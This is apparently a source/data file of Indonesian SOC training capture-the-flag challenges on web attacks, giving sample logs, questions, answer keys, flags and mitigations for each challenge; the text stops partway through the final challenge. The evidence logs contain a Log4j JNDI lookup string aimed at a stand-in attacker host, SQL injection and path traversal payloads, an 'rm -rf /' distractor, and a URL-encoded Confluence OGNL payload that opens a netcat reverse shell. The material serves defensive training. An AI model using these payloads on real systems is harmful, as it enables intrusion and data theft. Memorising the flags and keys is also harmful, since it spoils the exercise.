/**
 * Category B: Web Application Attacks (Challenges RC-CTF-006 to RC-CTF-011)
 * Conforms to LAPS-Heuristik SOC Investigation Architecture:
 * Case File -> Mission -> Evidence -> Timeline -> Investigation -> Flag -> Mitigation -> Reflection
 */

export const WEB_CHALLENGES = [
  {
    id: "RC-CTF-006",
    aliasId: "ctf-006",
    title: "Weak Credential & Log4j Remote Code Execution (Password123 Belum Tahun 2010)",
    category: "web",
    difficulty: "intermediate",
    estimatedMinutes: 20,
    xpReward: 100,
    sourceId: "cve-2021-44228",
    affectedTechnology: "Apache Log4j2 <= 2.14.1 on Java Spring Boot",
    mitreTechniques: ["T1190", "T1059"],
    lapsStage: "review",
    attackCategory: "web",
    realWorldCase: "Sensor NIDS mendeteksi string pola JNDI LDAP lookup pada header User-Agent yang dikirimkan ke server aplikasi sekolah. Log4j mem-parsing string tersebut dan memicu koneksi keluar ke server C2 jahat.",
    flag: "FLAG{PASSWORD123_BELUM_TAHUN_2010}",
    flagConfig: {
      value: "FLAG{PASSWORD123_BELUM_TAHUN_2010}",
      caseSensitive: false,
      maxAttempts: 5
    },
    mission: {
      objective: "Identifikasi string muatan eksploitasi ${jndi:ldap://...}, domain server C2, dan korelasi penggunaan kredensial default yang tertinggal pada sistem.",
      successCriteria: [
        "Temukan muatan eksploitasi JNDI LDAP pada nginx_access.log",
        "Identifikasi server C2 LDAP berbahaya yang dihubungi",
        "Korelasikan alert Suricata CVE-2021-44228 dengan request HTTP",
        "Submit flag dan rancang mitigasi patching library serta egress firewall"
      ]
    },
    caseBrief: {
      incidentCode: "INC-WEB-006",
      targetHost: "APP-PORTAL-JAVA (10.0.10.4)",
      detectionSource: "Suricata NIDS Rule 2034647 & Nginx Access Log",
      narrative: "Sensor NIDS mendeteksi string pola JNDI LDAP lookup pada header User-Agent yang dikirimkan ke server aplikasi sekolah. Log4j mem-parsing string tersebut dan memicu koneksi keluar.",
      mission: [
        "1. Temukan muatan eksploitasi ${jndi:ldap://...} pada access log.",
        "2. Identifikasi server C2 LDAP berbahaya yang dihubungi oleh server.",
        "3. Dapatkan flag bukti eksploitasi dan terapkan mitigasi environment flag."
      ]
    },
    timeline: [
      { time: "14:02:11 WIB", sensor: "nginx_access.log", event: "GET /api/search?q=matematika status 200 normal probe" },
      { time: "14:02:15 WIB", sensor: "nginx_access.log", event: "GET /login status 200 with User-Agent ${jndi:ldap://attacker-c2.corp-malicious.test:1389/Exploit}" },
      { time: "14:02:15 WIB", sensor: "suricata_alerts.log", event: "ET EXPLOIT Apache Log4j JNDI Lookup In HTTP Header (CVE-2021-44228)" },
      { time: "14:02:18 WIB", sensor: "nginx_access.log", event: "GET /api/user status 500 internal server error triggered by exploit lookup" }
    ],
    evidencePack: [
      {
        id: "ev-006-a",
        fileName: "nginx_access.log",
        fileType: "web_access",
        description: "Catatan akses HTTP server frontend",
        content: `198.51.100.80 - - [10/Dec/2021:14:02:11 +0700] "GET /api/search?q=matematika HTTP/1.1" 200 412 "Mozilla/5.0"
198.51.100.80 - - [10/Dec/2021:14:02:15 +0700] "GET /login HTTP/1.1" 200 1024 "\${jndi:ldap://attacker-c2.corp-malicious.test:1389/Exploit}"
198.51.100.80 - - [10/Dec/2021:14:02:18 +0700] "GET /api/user HTTP/1.1" 500 241 "\${jndi:ldap://attacker-c2.corp-malicious.test:1389/Exploit}"`
      },
      {
        id: "ev-006-b",
        fileName: "suricata_alerts.log",
        fileType: "nids_alert",
        description: "Peringatan sensor Snort/Suricata",
        content: `12/10-14:02:15.8920 [**] [1:2034647:1] ET EXPLOIT Apache Log4j JNDI Lookup In HTTP Header (CVE-2021-44228) [**] [Priority: 1] {TCP} 198.51.100.80:41214 -> 10.0.10.4:8080`
      }
    ],
    questions: [
      {
        id: "q1",
        question: "Domain/Host server LDAP berbahaya manakah yang coba dihubungi oleh string JNDI penyerang?",
        type: "single_choice",
        options: [
          { id: "a", text: "attacker-c2.corp-malicious.test" },
          { id: "b", text: "google.com" },
          { id: "c", text: "10.0.10.4" },
          { id: "d", text: "github.com" }
        ],
        correctAnswer: "a",
        explanation: "String eksploitasi mengarahkan JNDI lookup ke server ldap://attacker-c2.corp-malicious.test:1389/Exploit."
      }
    ],
    hints: [
      { tier: 1, text: "Perhatikan parameter dalam kurung ${jndi:ldap://...} pada access log dan adanya kredensial default yang rentan." },
      { tier: 2, text: "Identifikasi string eksploitasi pada header HTTP yang memicu koneksi keluar ke server C2." },
      { tier: 3, text: "Kombinasi eksploitasi web Log4j dan kredensial default sistem lama yang belum diganti sejak 2010." }
    ],
    mitigationSummary: "Perbarui pustaka Log4j2 ke versi >= 2.17.1, atur konfigurasi sistem log4j2.formatMsgNoLookups=true, dan blokir port outbound LDAP (1389) dan RMI (1099) pada firewall egress.",
    mitigation: [
      "Perbarui pustaka Log4j2 ke versi >= 2.17.1 pada seluruh layanan Java",
      "Aktifkan parameter JVM -Dlog4j2.formatMsgNoLookups=true",
      "Blokir koneksi outbound port 1389 (LDAP) dan 1099 (RMI) pada perimeter firewall"
    ],
    reflection: [
      "Mengapa kerentanan Log4Shell memiliki tingkat keparahan kritis (CVSS 10.0)?",
      "Evidence mana yang membuktikan aplikasi Java mencoba melakukan lookup ke luar?",
      "Apakah ada kemungkinan false positive jika penetration tester melakukan scanning resmi?",
      "Bagaimana cara memvalidasi keputusanmu dengan memeriksa firewall egress log?",
      "Mitigasi apa yang paling efektif diterapkan tanpa perlu menunggu redeployment kode?"
    ],
    lapsMapping: {
      understand: "Menganalisis bagaimana input yang belum divalidasi pada header HTTP dapat memicu eksekusi kode internal.",
      plan: "Merumuskan rule deteksi signature regex untuk menangkap variasi ${jndi:.",
      execute: "Mengecek header User-Agent pada access log.",
      review: "Meninjau pentingnya patch dependency management pada sistem perangkat lunak."
    }
  },
  {
    id: "RC-CTF-007",
    aliasId: "ctf-007",
    title: "SQL Injection Authentication Bypass & Auth Log Audit (Auth Log Tahu Segalanya)",
    category: "web",
    difficulty: "beginner",
    estimatedMinutes: 15,
    xpReward: 50,
    sourceId: "owasp-top10-sqli",
    affectedTechnology: "PHP 7.4 / Apache / MariaDB",
    mitreTechniques: ["T1190"],
    lapsStage: "review",
    attackCategory: "web",
    realWorldCase: "Siswa mencoba memasukkan karakter petik tunggal dan operator logika Boolean pada form login ujian sekolah untuk mengelabui query SQL.",
    flag: "FLAG{AUTH_LOG_TAHU_SEGALANYA}",
    flagConfig: {
      value: "FLAG{AUTH_LOG_TAHU_SEGALANYA}",
      caseSensitive: false,
      maxAttempts: 5
    },
    mission: {
      objective: "Menganalisis query SQL tautology yang membobol login portal ujian dan meneliti catatan log otentikasi database.",
      successCriteria: [
        "Identifikasi payload SQL Injection pada mysql_query.log",
        "Analisis mengapa logika query bernilai TRUE tanpa verifikasi password",
        "Verifikasi akun superadmin yang berhasil ditembus",
        "Submit flag dan rancang perbaikan parameterized query (PDO)"
      ]
    },
    caseBrief: {
      incidentCode: "INC-WEB-007",
      targetHost: "CBT-EXAM-SRV (192.168.1.100)",
      detectionSource: "ModSecurity WAF & Database Query Log",
      narrative: "Siswa iseng mencoba memasukkan karakter petik tunggal dan operator logika Boolean pada form login ujian sekolah untuk mengelabui query SQL.",
      mission: [
        "1. Identifikasi payload injeksi SQL yang dimasukkan pada kolom username.",
        "2. Analisis mengapa query SQL database menjadi selalu bernilai TRUE.",
        "3. Tentukan perbaikan parameterized queries / PDO."
      ]
    },
    timeline: [
      { time: "08:10:00 WIB", sensor: "mysql_query.log", event: "Query SELECT * FROM users WHERE username = 'admin' AND password = 'password123' (Failed)" },
      { time: "08:10:45 WIB", sensor: "mysql_query.log", event: "Query SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = 'xxx'" },
      { time: "08:10:46 WIB", sensor: "mysql_query.log", event: "Query SUCCESS 1 row returned (uid=1, role=superadmin)" }
    ],
    evidencePack: [
      {
        id: "ev-007-a",
        fileName: "mysql_query.log",
        fileType: "database_log",
        description: "Catatan eksekusi query SQL server database",
        content: `2026-09-28T08:10:00.124Z 14 Query SELECT * FROM users WHERE username = 'admin' AND password = 'password123'
2026-09-28T08:10:45.892Z 15 Query SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = 'xxx'
2026-09-28T08:10:46.002Z 15 Query [SUCCESS] 1 row returned (uid=1, role=superadmin)`
      }
    ],
    questions: [
      {
        id: "q1",
        question: "Muatan (payload) SQL injection apakah yang berhasil mem-bypass otentikasi login?",
        type: "single_choice",
        options: [
          { id: "a", text: "<script>alert(1)</script>" },
          { id: "b", text: "' OR '1'='1' -- " },
          { id: "c", text: "&& rm -rf /" },
          { id: "d", text: "../../../../etc/shadow" }
        ],
        correctAnswer: "b",
        explanation: "Payload ' OR '1'='1' -- meniadakan validasi password dengan menyisipkan kondisi logika yang selalu bernilai benar dan mengabaikan sisa query sebagai komentar."
      }
    ],
    hints: [
      { tier: 1, text: "Periksa baris query nomor 15 pada berkas mysql_query.log." },
      { tier: 2, text: "Perhatikan payload logika boolean ' OR '1'='1' yang meniadakan pengecekan kata sandi." },
      { tier: 3, text: "Seluruh jejak manipulasi query tercatat lengkap pada authentication dan query log basis data." }
    ],
    mitigationSummary: "Gunakan Prepared Statements dengan Parameterized Queries (PDO atau MySQLi), hindari penggabungan string query langsung, dan terapkan input validation yang ketat.",
    mitigation: [
      "Gunakan PDO Prepared Statements dengan parameter binding pada seluruh query SQL",
      "Pasang ModSecurity OWASP Core Rule Set (CRS) untuk memblokir pola tautology SQLi",
      "Terapkan prinsip least privilege pada user database aplikasi web"
    ],
    reflection: [
      "Mengapa query SQL dinamis sangat rentan terhadap manipulasi karakter kutip?",
      "Evidence mana yang membuktikan penyerang mendapatkan akses level superadmin?",
      "Apakah ada kemungkinan false positive jika pengguna memiliki nama seperti O'Connor?",
      "Bagaimana cara memvalidasi keputusanmu melalui perbandingan query normal vs manipulasi?",
      "Mitigasi apa yang secara tuntas menghapus risiko SQL injection?"
    ],
    lapsMapping: {
      understand: "Memahami bagaimana manipulasi struktur query mengubah logika eksekusi basis data.",
      plan: "Merencanakan penggantian kode query rentan dengan PDO prepared statement.",
      execute: "Membedah query log database MariaDB.",
      review: "Mengevaluasi pengamanan lapisan aplikasi web sekolah."
    }
  },
  {
    id: "RC-CTF-008",
    aliasId: "ctf-008",
    title: "Path Traversal & Linux Log Grep (Grep Sampai Ketemu)",
    category: "web",
    difficulty: "beginner",
    estimatedMinutes: 15,
    xpReward: 50,
    sourceId: "cve-2021-23017",
    affectedTechnology: "Nginx / Node.js Express File Server",
    mitreTechniques: ["T1006", "T1190"],
    lapsStage: "review",
    attackCategory: "web",
    realWorldCase: "Endpoint pengunduh tugas siswa (/download?file=...) tidak memfilter urutan karakter ../ sehingga penyerang dapat melompat keluar dari direktori publik dan membaca file sensitif sistem operasi.",
    flag: "FLAG{GREP_SAMPAI_KETEMU}",
    flagConfig: {
      value: "FLAG{GREP_SAMPAI_KETEMU}",
      caseSensitive: false,
      maxAttempts: 5
    },
    mission: {
      objective: "Gunakan investigasi log dan teknik grep untuk menemukan file sistem sensitif yang berhasil diunduh penyerang melalui Directory Traversal.",
      successCriteria: [
        "Grep berkas file_access.log untuk menemukan urutan karakter ../",
        "Identifikasi berkas Linux yang mengembalikan status respons HTTP 200 OK",
        "Bedakan respons sukses 200 dengan respons penolakan 403 Forbidden",
        "Submit flag dan rancang mitigasi path.basename() sanitization"
      ]
    },
    caseBrief: {
      incidentCode: "INC-WEB-008",
      targetHost: "FILE-SHARE-SRV (10.10.15.20)",
      detectionSource: "Web Server Access Log",
      narrative: "Endpoint pengunduh tugas siswa (/download?file=...) tidak memfilter urutan karakter ../ sehingga penyerang dapat melompat keluar dari direktori publik dan membaca file sensitif sistem operasi.",
      mission: [
        "1. Identifikasi request HTTP yang mengeksploitasi Directory Traversal.",
        "2. Temukan file sistem operasi Linux yang berhasil diunduh penyerang.",
        "3. Tentukan fungsi sanitasi path yang aman."
      ]
    },
    timeline: [
      { time: "09:15:01 WIB", sensor: "file_access.log", event: "GET /download?file=tugas_jaringan.pdf status 200 (normal user activity)" },
      { time: "09:15:10 WIB", sensor: "file_access.log", event: "GET /download?file=../../../../etc/passwd status 200 length 1842 (traversal breach)" },
      { time: "09:15:15 WIB", sensor: "file_access.log", event: "GET /download?file=../../../../etc/shadow status 403 length 162 (blocked by OS permission)" }
    ],
    evidencePack: [
      {
        id: "ev-008-a",
        fileName: "file_access.log",
        fileType: "web_access",
        description: "Catatan akses unduhan berkas",
        content: `192.168.1.80 - - [29/Sep/2026:09:15:01 +0700] "GET /download?file=tugas_jaringan.pdf HTTP/1.1" 200 489214
192.168.1.80 - - [29/Sep/2026:09:15:10 +0700] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 1842
192.168.1.80 - - [29/Sep/2026:09:15:15 +0700] "GET /download?file=../../../../etc/shadow HTTP/1.1" 403 162`
      }
    ],
    questions: [
      {
        id: "q1",
        question: "File sistem Linux apa yang berhasil dibaca penyerang dengan status HTTP 200?",
        type: "single_choice",
        options: [
          { id: "a", text: "/etc/shadow" },
          { id: "b", text: "/etc/passwd" },
          { id: "c", text: "tugas_jaringan.pdf" },
          { id: "d", text: "/var/log/syslog" }
        ],
        correctAnswer: "b",
        explanation: "Request /download?file=../../../../etc/passwd mengembalikan status 200 OK dengan ukuran 1842 byte."
      }
    ],
    hints: [
      { tier: 1, text: "Gunakan pencarian pola atau perintah grep pada berkas file_access.log untuk menyaring baris mencurigakan." },
      { tier: 2, text: "Cari baris yang memuat traversal '../' dan menghasilkan status respons HTTP 200 OK." },
      { tier: 3, text: "File /etc/passwd berhasil terekspos karena kelemahan sanitasi input parameter download." }
    ],
    mitigationSummary: "Gunakan fungsi path.basename(), hindari penerimaan path absolut langsung dari pengguna, dan jalankan proses web server di bawah chroot jail dengan hak akses terendah.",
    mitigation: [
      "Sanitasi seluruh parameter file menggunakan path.basename() dan whitelist direktori",
      "Karantina proses web server menggunakan chroot jail atau Linux container isolasi",
      "Kunci izin baca file konfigurasi sensitif hanya untuk root"
    ],
    reflection: [
      "Bagaimana perintah grep membantu analis menyaring log bervolume besar secara presisi?",
      "Evidence mana yang membuktikan file berhasil diunduh penyerang?",
      "Mengapa /etc/shadow mengembalikan status 403 sedangkan /etc/passwd mengembalikan 200?",
      "Bagaimana cara memvalidasi keputusanmu dengan memeriksa integritas akun di /etc/passwd?",
      "Mitigasi kode apa yang paling ampuh mencegah path traversal?"
    ],
    lapsMapping: {
      understand: "Memahami bahaya Directory Traversal terhadap kerahasiaan konfigurasi sistem.",
      plan: "Merumuskan logika sanitasi karakter titik-titik garis miring.",
      execute: "Mengevaluasi kode status HTTP 200 vs 403.",
      review: "Meninjau izin berkas pada sistem operasi server."
    }
  },
  {
    id: "RC-CTF-009",
    aliasId: "ctf-009",
    title: "WAF Alert Triage: False Positive Analysis (False Positive Tapi Baper)",
    category: "web",
    difficulty: "intermediate",
    estimatedMinutes: 20,
    xpReward: 100,
    sourceId: "mitre-t1505-003",
    affectedTechnology: "Apache HTTP Server / ModSecurity WAF",
    mitreTechniques: ["T1190"],
    lapsStage: "review",
    attackCategory: "web",
    realWorldCase: "Dashboard WAF membunyikan alert tingkat tinggi 'SQL Injection Attempt'. Namun setelah diinvestigasi oleh analis senior, request tersebut berasal dari IP pemindai keamanan internal yang terdaftar dalam jadwal audit rutin sekolah.",
    flag: "FLAG{FALSE_POSITIVE_TAPI_BAPER}",
    flagConfig: {
      value: "FLAG{FALSE_POSITIVE_TAPI_BAPER}",
      caseSensitive: false,
      maxAttempts: 5
    },
    mission: {
      objective: "Lakukan triase terhadap peringatan WAF bernilai merah dan buktikan bahwa peringatan tersebut merupakan False Positive dari pemindaian kepatuhan internal.",
      successCriteria: [
        "Analisis modsec_audit.log untuk menemukan IP sumber dan User-Agent",
        "Verifikasi apakah IP 10.0.0.254 adalah scanner keamanan internal resmi",
        "Tentukan klasifikasi triase yang tepat (False Positive vs True Positive)",
        "Submit flag dan rekomendasikan pengecualian rule WAF terarah"
      ]
    },
    caseBrief: {
      incidentCode: "INC-WEB-009",
      targetHost: "WEB-SEKOLAH (10.0.0.12)",
      detectionSource: "ModSecurity WAF Alert Log",
      narrative: "Dashboard WAF membunyikan alert tingkat tinggi 'SQL Injection Attempt'. Namun setelah diinvestigasi oleh analis senior, request tersebut berasal dari IP pemindai keamanan internal yang terdaftar dalam jadwal audit rutin sekolah.",
      mission: [
        "1. Analisis modsec_audit.log untuk menemukan IP sumber dan User-Agent.",
        "2. Verifikasi apakah IP 10.0.0.254 adalah scanner keamanan internal resmi.",
        "3. Tentukan klasifikasi triase yang tepat (False Positive vs True Positive)."
      ]
    },
    timeline: [
      { time: "03:00:01 WIB", sensor: "modsec_audit.log", event: "WAF Alert 942100: SQL Injection Attempt detected on /api/health?test=1' OR '1'='1" },
      { time: "03:00:02 WIB", sensor: "modsec_audit.log", event: "Source IP: 10.0.0.254 | User-Agent: InternalSecurityScanner-ScheduledAudit/3.2" },
      { time: "03:00:05 WIB", sensor: "soc_ticket.log", event: "Maintenance Window: Weekly Automated Vulnerability Scan pre-approved by IT Manager" }
    ],
    evidencePack: [
      {
        id: "ev-009-a",
        fileName: "modsec_audit.log",
        fileType: "waf_log",
        description: "Catatan transaksi WAF ModSecurity",
        content: `[29/Sep/2026:03:00:01 +0700] [942100] [client 10.0.0.254] ModSecurity: Warning. Pattern match ".*" at ARGS:test. [msg "SQL Injection Attempt"] [severity "CRITICAL"]
[29/Sep/2026:03:00:02 +0700] Request: GET /api/health?test=1%27%20OR%20%271%27=%271 HTTP/1.1
[29/Sep/2026:03:00:02 +0700] Headers: Host: 10.0.0.12, User-Agent: InternalSecurityScanner-ScheduledAudit/3.2 (Authorized Security Audit)`
      },
      {
        id: "ev-009-b",
        fileName: "internal_asset_registry.csv",
        fileType: "csv",
        description: "Daftar inventaris aset dan scanner resmi sekolah",
        content: `IP_Address,Host_Name,Role,Authorized_Activity
10.0.0.12,WEB-SEKOLAH,Web Server Production,Public Web
10.0.0.254,SEC-AUDIT-SCANNER,OpenVAS/Nessus Scanner,Weekly Security Audit (02:00-04:00 WIB)`
      }
    ],
    questions: [
      {
        id: "q1",
        question: "Berdasarkan bukti modsec_audit.log dan asset registry, apakah klasifikasi yang tepat untuk alert ini?",
        type: "single_choice",
        options: [
          { id: "a", text: "True Positive (Serangan penyerang luar berhasil)" },
          { id: "b", text: "False Positive (Aktivitas scanner keamanan internal yang terotorisasi)" },
          { id: "c", text: "Hardware Failure" },
          { id: "d", text: "DDoS Attack" }
        ],
        correctAnswer: "b",
        explanation: "Request berasal dari IP 10.0.0.254 (SEC-AUDIT-SCANNER) dengan User-Agent audit resmi pada jadwal pemeliharaan terencana, sehingga diklasifikasikan sebagai False Positive."
      },
      {
        id: "q2",
        question: "Tindakan apakah yang sebaiknya dilakukan analis SOC pemula saat menghadapi situasi ini?",
        type: "single_choice",
        options: [
          { id: "a", text: "Langsung memblokir IP scanner dan mematikan server" },
          { id: "b", text: "Verifikasi jadwal pemeliharaan dan kecocokan inventaris aset sebelum mengambil kesimpulan" },
          { id: "c", text: "Menghapus seluruh file konfigurasi WAF" },
          { id: "d", text: "Mengabaikan semua alert di masa depan" }
        ],
        correctAnswer: "b",
        explanation: "Analis harus melakukan korelasi bukti log dengan inventaris aset dan jadwal change-management sebelum membuat kesimpulan emosional."
      }
    ],
    hints: [
      { tier: 1, text: "Periksa apakah IP asal request berasal dari jaringan internal yang memiliki jadwal audit resmi." },
      { tier: 2, text: "Bandingkan IP 10.0.0.254 pada file internal_asset_registry.csv dengan string User-Agent pada berkas modsec_audit.log." },
      { tier: 3, text: "Alert merah tidak selalu serangan nyata; jangan baper dan simpulkan status False Positive secara objektif." }
    ],
    mitigationSummary: "Buat aturan pengecualian (WAF rule exclusion) khusus untuk IP scanner internal 10.0.0.254 selama jendela pemeliharaan agar tidak membanjiri antrean alert SOC.",
    mitigation: [
      "Tambahkan pengecualian SecRuleRemoveByTag untuk IP 10.0.0.254 pada ModSecurity",
      "Dokumentasikan jendela audit rutin dalam kalender operasional SOC",
      "Pertahankan pemantauan pasif tanpa memblokir pemindai resmi"
    ],
    reflection: [
      "Mengapa analis SOC tidak boleh langsung 'baper' atau panik saat melihat alert merah?",
      "Evidence mana yang paling meyakinkan bahwa request tersebut bukan dari peretas jahat?",
      "Apa dampak buruk jika analis langsung memblokir scanner keamanan internal?",
      "Bagaimana cara memvalidasi keputusanmu dengan membaca change management ticket?",
      "Mitigasi apa yang memastikan scanner internal dapat bekerja tanpa menimbulkan alert palsu?"
    ],
    lapsMapping: {
      understand: "Memahami perbedaan mendasar antara serangan siber nyata dan pemindaian keamanan kepatuhan internal.",
      plan: "Mengevaluasi daftar aset resmi dan jadwal audit terjadwal.",
      execute: "Mengkorelasikan IP sumber WAF dengan inventaris host sekolah.",
      review: "Mengevaluasi dampak alert fatigue terhadap kesiapan tim SOC."
    }
  },
  {
    id: "RC-CTF-010",
    aliasId: "ctf-010",
    title: "Incomplete Packet Capture & Insufficient Evidence (Need More Evidence Bro)",
    category: "web",
    difficulty: "advanced",
    estimatedMinutes: 20,
    xpReward: 150,
    sourceId: "cve-2017-5638",
    affectedTechnology: "Apache Struts 2.3.x Jakarta Multipart Parser",
    mitreTechniques: ["T1190"],
    lapsStage: "review",
    attackCategory: "web",
    realWorldCase: "Sensor NIDS menangkap satu potongan paket terfragmentasi yang tampak seperti upaya eksploitasi web, namun datanya terpotong dan tidak ada catatan access log yang mengonfirmasi apakah server terpengaruh.",
    flag: "FLAG{NEED_MORE_EVIDENCE_BRO}",
    flagConfig: {
      value: "FLAG{NEED_MORE_EVIDENCE_BRO}",
      caseSensitive: false,
      maxAttempts: 5
    },
    mission: {
      objective: "Terapkan prinsip penyelidikan bukti ilmiah: tentukan bahwa 1 paket terpotong belum cukup untuk menyimpulkan insiden tanpa adanya bukti penguat sekunder.",
      successCriteria: [
        "Analisis suricata_fragmented.log dan perhatikan peringatan PAYLOAD_TRUNCATED",
        "Periksa apakah terdapat log web server pendukung yang mengonfirmasi respons HTTP",
        "Tentukan status triase Need More Evidence secara tepat",
        "Submit flag dan formulasikan permintaan bukti forensik lanjutan"
      ]
    },
    caseBrief: {
      incidentCode: "INC-WEB-010",
      targetHost: "FINANCE-PORTAL (10.0.8.10)",
      detectionSource: "Suricata NIDS Fragment Monitor",
      narrative: "Sensor NIDS menangkap satu potongan paket terfragmentasi yang tampak seperti upaya eksploitasi web, namun datanya terpotong dan tidak ada catatan access log yang mengonfirmasi apakah server terpengaruh.",
      mission: [
        "1. Analisis suricata_fragmented.log dan perhatikan peringatan PAYLOAD_TRUNCATED.",
        "2. Periksa apakah terdapat log web server pendukung yang mengonfirmasi respons HTTP.",
        "3. Tentukan status triase Need More Evidence secara tepat."
      ]
    },
    timeline: [
      { time: "11:05:01 WIB", sensor: "suricata_fragmented.log", event: "ALERT: Potential Web Exploit (Incomplete Fragment) [PAYLOAD_TRUNCATED]" },
      { time: "11:05:02 WIB", sensor: "web_access.log", event: "NO_RECORD: Web server access log buffer missing for timestamp 11:05:01" }
    ],
    evidencePack: [
      {
        id: "ev-010-a",
        fileName: "suricata_fragmented.log",
        fileType: "nids_alert",
        description: "Catatan transaksi paket terfragmentasi",
        content: `11:05:01.120 [**] [1:2009999:1] ET INCOMPLETE TCP Segment (Potential OGNL Payload) [**] {TCP} 198.51.100.99:54321 -> 10.0.8.10:8080
[RAW_HEX: 25 7b 28 23 5f 3d 27 ... [DATA TRUNCATED - BUFFER OVERFLOW ON SENSOR]]
[STATUS: INSUFFICIENT DATA TO VERIFY TARGET RESPONSE OR APPLICATION CRASH]`
      }
    ],
    questions: [
      {
        id: "q1",
        question: "Berdasarkan potongan paket yang terpotong di atas tanpa ada log respons aplikasi, apa keputusan triase yang paling tepat?",
        type: "single_choice",
        options: [
          { id: "a", text: "True Positive — Pasti server sudah diambil alih total" },
          { id: "b", text: "Need More Evidence — Data terpotong dan memerlukan log host/PCAP penuh untuk konfirmasi" },
          { id: "c", text: "False Positive — Abaikan saja karena tidak penting" },
          { id: "d", text: "Matikan langsung seluruh listrik gedung kantor" }
        ],
        correctAnswer: "b",
        explanation: "Dalam metodologi LAPS-Heuristik, bukti yang tidak lengkap (truncated payload tanpa respons server) mewajibkan status Need More Evidence sebelum membuat tuduhan kompromi."
      }
    ],
    hints: [
      { tier: 1, text: "Satu baris paket yang terpotong tidak cukup untuk menyatakan server telah tertembus sepenuhnya." },
      { tier: 2, text: "Evaluasi apakah ada log sekunder (access log, system log) yang membuktikan apakah perintah berhasil dieksekusi." },
      { tier: 3, text: "Prinsip LAPS-Heuristik: butuh lebih banyak bukti (need more evidence) sebelum menyimpulkan status kompromi." }
    ],
    mitigationSummary: "Tingkatkan buffer penangkapan paket pada sensor NIDS, aktifkan full packet capture (PCAP) pada segmen finansial, dan audit logging pada web server Apache.",
    mitigation: [
      "Perbesar capture buffer size pada sensor Suricata NIDS",
      "Konfigurasikan sinkronisasi syslog server web ke SIEM terpusat",
      "Lakukan inspeksi endpoint host untuk memeriksa proses aktif dan koneksi TCP ESTABLISHED"
    ],
    reflection: [
      "Mengapa integritas bukti merupakan syarat mutlak dalam analisis forensik digital?",
      "Evidence mana yang menunjukkan bahwa paket tersebut mengalami pemotongan (truncation)?",
      "Apa bahaya dari mengambil kesimpulan prematur saat bukti masih parsial?",
      "Bagaimana cara memvalidasi keputusanmu dengan meminta data PCAP lengkap?",
      "Mitigasi apa yang menjamin tidak ada celah visibilitas (blind spot) pada jaringan?"
    ],
    lapsMapping: {
      understand: "Memahami batas kemampuan sensor jaringan ketika menangani paket terfragmentasi.",
      plan: "Merumuskan kebutuhan pengumpulan bukti sekunder (host-based telemetry).",
      execute: "Mengevaluasi catatan sensor truncated hex dump.",
      review: "Menerapkan prinsip kehati-hatian pembuktian ilmiah pada triase SOC."
    }
  },
  {
    id: "RC-CTF-011",
    aliasId: "ctf-011",
    title: "Confluence Pre-Auth RCE: Confirmed True Positive (TP Ketemu Juga Akhirnya)",
    category: "web",
    difficulty: "advanced",
    estimatedMinutes: 20,
    xpReward: 175,
    sourceId: "cve-2022-26134",
    affectedTechnology: "Atlassian Confluence Server / Java",
    mitreTechniques: ["T1190", "T1059.004"],
    lapsStage: "review",
    attackCategory: "web",
    realWorldCase: "Eksploitasi zero-day yang dicatat CISA KEV di mana penyerang mengirimkan ekspresi OGNL di dalam URI path HTTP request untuk mendapatkan reverse shell tanpa perlu login.",
    flag: "FLAG{TP_KETEMU_JUGA_AKHIRNYA}",
    flagConfig: {
      value: "FLAG{TP_KETEMU_JUGA_AKHIRNYA}",
      caseSensitive: false,
      maxAttempts: 5
    },
    mission: {
      objective: "Verifikasi eksploitasi Confluence pre-auth RCE dan buktikan status True Positive melalui korelasi URI request dengan sesi reverse shell aktif.",
      successCriteria: [
        "Periksa URI path yang memuat karakter ${...} pada tomcat_access.log",
        "Dekode string URL-encoded untuk menemukan perintah netcat (nc)",
        "Identifikasi alamat IP dan port tujuan reverse shell (4444)",
        "Submit flag dan rekomendasikan patch darurat CISA KEV"
      ]
    },
    caseBrief: {
      incidentCode: "INC-WEB-011",
      targetHost: "WIKI-KOLABORASI (10.0.12.5)",
      detectionSource: "Apache Tomcat Access Log & NIDS",
      narrative: "Eksploitasi zero-day yang dicatat CISA KEV di mana penyerang mengirimkan ekspresi OGNL di dalam URI path HTTP request untuk mendapatkan reverse shell tanpa perlu login.",
      mission: [
        "1. Periksa URI path yang memuat karakter ${...}.",
        "2. Identifikasi alamat IP dan port tujuan reverse shell yang dicoba penyerang.",
        "3. Rangkum analisis insiden."
      ]
    },
    timeline: [
      { time: "15:30:12 WIB", sensor: "tomcat_access.log", event: "GET /%24%7B%28%23a%3D%40org... status 302 (payload executed)" },
      { time: "15:30:13 WIB", sensor: "firewall_egress.log", event: "ALLOW TCP 10.0.12.5:51240 -> 198.51.100.115:4444 (Reverse Shell Connected)" }
    ],
    evidencePack: [
      {
        id: "ev-011-a",
        fileName: "tomcat_access.log",
        fileType: "web_access",
        description: "Catatan akses web container Tomcat",
        content: `198.51.100.115 - - [02/Jun/2022:15:30:12] "GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27nc%20198.51.100.115%204444%20-e%20/bin/sh%27%29.getInputStream%28%29%2C%27utf-8%27%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%27X-Cmd-Response%27%2C%23a%29%7D/ HTTP/1.1" 302 -`
      }
    ],
    questions: [
      {
        id: "q1",
        question: "Port berapakah yang digunakan penyerang untuk menerima koneksi reverse shell netcat (nc)?",
        type: "single_choice",
        options: [
          { id: "a", text: "80" },
          { id: "b", text: "4444" },
          { id: "c", text: "8080" },
          { id: "d", text: "22" }
        ],
        correctAnswer: "b",
        explanation: "URL-decoded string menunjukkan eksekusi 'nc 198.51.100.115 4444 -e /bin/sh'."
      }
    ],
    hints: [
      { tier: 1, text: "Decode nilai URL encoding (%20 adalah spasi, %27 adalah tanda petik tunggal)." },
      { tier: 2, text: "Periksa parameter netcat (nc) dan port reverse shell pada URI request." },
      { tier: 3, text: "Korelasi bukti eksploitasi dan koneksi keluar menegaskan konfirmasi True Positive." }
    ],
    mitigationSummary: "Perbarui Confluence ke rilis keamanan terbaru, gunakan WAF untuk memblokir kurung kurawal pada URI path, dan isolasi jaringan wiki dari akses internet langsung.",
    mitigation: [
      "Perbarui Atlassian Confluence segera sesuai advisori keamanan CISA CVE-2022-26134",
      "Blokir karakter ${ dan %24%7B pada URI path menggunakan Web Application Firewall",
      "Batasi koneksi outbound egress dari server aplikasi ke internet publik"
    ],
    reflection: [
